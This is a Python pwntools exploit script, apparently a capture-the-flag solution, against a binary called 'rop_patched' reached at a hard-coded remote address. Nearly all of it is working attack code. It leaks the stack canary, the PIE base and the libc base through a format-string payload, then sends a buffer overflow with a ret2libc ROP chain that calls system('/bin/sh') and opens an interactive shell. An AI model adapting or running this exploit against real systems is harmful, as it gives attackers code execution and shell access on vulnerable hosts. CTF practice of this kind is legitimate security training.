### ENV ###
# patch with 'pwninit'
# ROPgadget --binary rop_patched | grep ": ret"
# ROPgadget --binary rop_patched | grep ": pop rdi"


### EXPLOIT ###

#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("143.244.138.133", 8001)
    return r

def main():
    r = conn()
    pause()

    # pl = '|'.join(['%p']*20)
    # pl = '|'.join(f'%{i}$p' for i in range(2*8, 3*8+1))
    pl = '%15$p|%17$p|%21$p' # canary_leak, pie_leak, libc_leak
    # print(pl)

    r.sendlineafter("username: ", pl)

    leak = r.recvline().split(b'|')
    print(leak)

    canary = int(leak[0].strip(b'Hello '), 16)
    pie_base = int(leak[1], 16) - 0x8c7
    libc_base = int(leak[2], 16) - 0x21c87
    canary_offset = cyclic_find('saaa')
    pop_rdi = pie_base + 0x0000000000000963 # : pop rdi ; ret
    ret = pie_base + 0x0000000000000646 # : pop rdi ; ret

    print(f"canary:    0x{canary:x}")    
    print(f"libc_base: 0x{libc_base:x}")
    print(f"pie_base:  0x{pie_base:x}")
    print(f"pop_rdi:   0x{pop_rdi:x}")

    offset = cyclic_find('caaa')    
    # pl = b'A'*canary_offset + p64(canary) + cyclic(100)
    libc.address = libc_base
    pl = b'A'*canary_offset + p64(canary) + b'B'*offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
    r.sendlineafter("password: ", pl)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
